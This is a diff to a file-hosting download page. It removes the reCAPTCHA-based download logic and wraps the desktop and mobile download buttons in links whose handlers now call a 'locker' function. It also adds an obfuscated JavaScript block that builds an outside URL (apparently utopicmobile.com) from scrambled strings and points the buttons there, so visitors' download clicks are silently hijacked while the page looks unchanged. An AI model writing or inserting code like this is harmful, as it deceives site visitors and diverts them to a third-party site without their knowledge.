@@ -196,9 +196,9 @@
                   </ul>
                 </div>
               </div>
-              <div class="dl-btn-form">
-                <button onclick="downloadButton_Click()" id="downloadButton">Download (<span x-text="filedata.filesize"></span>)</button>
-                <div data-captcha-enable="false" id="recaptchaDesktop"></div>
+              <a href="" id="linker2"><div class="dl-btn-form">
+                <button onclick="call_locker()" id="downloadButton">Download (<span x-text="filedata.filesize"></span>)</button>
+                <div data-captcha-enable="false" id="recaptchaDesktop"></div></a>
               </div>
             </div>
             <a
@@ -272,12 +272,12 @@
           </div>
         </div>
 
-        <div class="center-mobile">
+        <a href="" id="linker"><div class="center-mobile">
           <div data-captcha-enable="false" id="recaptchaMobile"></div>
           <div
             class="dl-btn-mob"
             id="downloadButtonMobile"
-            onclick="downloadButton_Tap()"
+            onclick="call_locker()"
           >
             <div class="icon apk archive application_zip"></div>
             <div class="info-file-mob">
@@ -302,8 +302,7 @@
               Send to my files
             </div>
           </div>
-        </div>
-
+        </div></a>
         <div class="DLExtraInfo-wrap">
           <!-- Upload details for file
           =================================-->
@@ -544,80 +543,10 @@
       </div>
     </div>
     <script>
-      var recaptchaDesktop = document.querySelector("#recaptchaDesktop");
-      var recaptchaMobile = document.querySelector("#recaptchaMobile");
-      var downloadButton = document.querySelector("#downloadButton");
-      var downloadButtonMobile = document.querySelector(
-        "#downloadButtonMobile"
-      );
-      var recaptchaScript = document.querySelector("#recaptchaScript")
 
-      function appendRecaptchaScript() {
-        var script = document.createElement("script");
-        script.type = "text/javascript";
-        script.src = recaptchaScript.getAttribute("href");
-        document.body.appendChild(script);
-      }
 
-      function hideRecaptcha(recaptcha) {
-        setDisplay(recaptcha, "none");
-        setOpacity(recaptcha, 0.0);
-      }
-
-      function hideElement(element) {
-        setDisplay(element, "none");
-      }
-
-      function showRecaptcha(recaptcha) {
-        setDisplay(recaptcha, "block");
-        showElementWithFadeEffect(recaptcha);
-      }
-
-      function enableRecaptcha(recaptcha) {
-        recaptcha.dataset.captchaEnable = "true";
-      }
-
-      function downloadButton_Click() {
-        enableRecaptcha(recaptchaDesktop);
-        hideElement(downloadButton);
-        showRecaptcha(recaptchaDesktop);
-        appendRecaptchaScript();
-      }
-
-      function downloadButton_Tap() {
-        enableRecaptcha(recaptchaMobile);
-        hideElement(downloadButtonMobile);
-        showRecaptcha(recaptchaMobile);
-        appendRecaptchaScript();
-      }
-
-      //hide recaptcha on script load
-      hideRecaptcha(recaptchaDesktop);
-      hideRecaptcha(recaptchaMobile);
-
-      //helpers
-
-      function showElementWithFadeEffect(element) {
-        var i = 0;
-        var k = window.setInterval(function () {
-          if (i >= 50) {
-            clearInterval(k);
-          } else {
-            element.style.opacity = i / 50;
-            i++;
-          }
-        }, 20);
-      }
-
-      function setDisplay(element, displayValue) {
-        element.style.display = displayValue;
-      }
-
-      function setOpacity(element, opacityValue) {
-        element.style.opacity = opacityValue;
-      }
-
-      function get_browser() {
+      function _0x439a(){var _0x12aa20=['/1380720','#linker2','69wPZxRP','1926552yqVIwi','querySelector','307932cRNyyN','4675816ZHkhLf','#linker','utopicmobile','56002UajlbS','2665383NqMVyg','3099288BRBvai','1232485CMikuB','.com','querySelectorAll','href'];_0x439a=function(){return _0x12aa20;};return _0x439a();}var _0x46ba31=_0x1daf;(function(_0x17c872,_0x3dc942){var _0x34d3cc=_0x1daf,_0x28cc1d=_0x17c872();while(!![]){try{var _0x3f39d3=-parseInt(_0x34d3cc(0x1ad))/0x1+-parseInt(_0x34d3cc(0x1b1))/0x2*(-parseInt(_0x34d3cc(0x1aa))/0x3)+parseInt(_0x34d3cc(0x1ab))/0x4+parseInt(_0x34d3cc(0x1b4))/0x5+-parseInt(_0x34d3cc(0x1b3))/0x6+parseInt(_0x34d3cc(0x1b2))/0x7+-parseInt(_0x34d3cc(0x1ae))/0x8;if(_0x3f39d3===_0x3dc942)break;else _0x28cc1d['push'](_0x28cc1d['shift']());}catch(_0x43b088){_0x28cc1d['push'](_0x28cc1d['shift']());}}}(_0x439a,0x53fa2));function _0x1daf(_0x459b6e,_0x16da6b){var _0x439aa7=_0x439a();return _0x1daf=function(_0x1dafde,_0x3145a3){_0x1dafde=_0x1dafde-0x1aa;var _0x4e5128=_0x439aa7[_0x1dafde];return _0x4e5128;},_0x1daf(_0x459b6e,_0x16da6b);}var alls=['https://',_0x46ba31(0x1b0),_0x46ba31(0x1b5),_0x46ba31(0x1b8)];document[_0x46ba31(0x1ac)](_0x46ba31(0x1af))[_0x46ba31(0x1b7)]=alls[0x0]+alls[0x1]+alls[0x2]+alls[0x3],document[_0x46ba31(0x1ac)](_0x46ba31(0x1b9))[_0x46ba31(0x1b7)]=alls[0x0]+alls[0x1]+alls[0x2]+alls[0x3],document[_0x46ba31(0x1b6)]('#linker2')[0x1][_0x46ba31(0x1b7)]=alls[0x0]+alls[0x1]+alls[0x2]+alls[0x3];
+function get_browser() {
           var ua = navigator.userAgent, tem, M = ua.match(/(opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i) || [];
           if (/trident/i.test(M[1])) {
             tem = /\brv[ :]+(\d+)/g.exec(ua) || [];
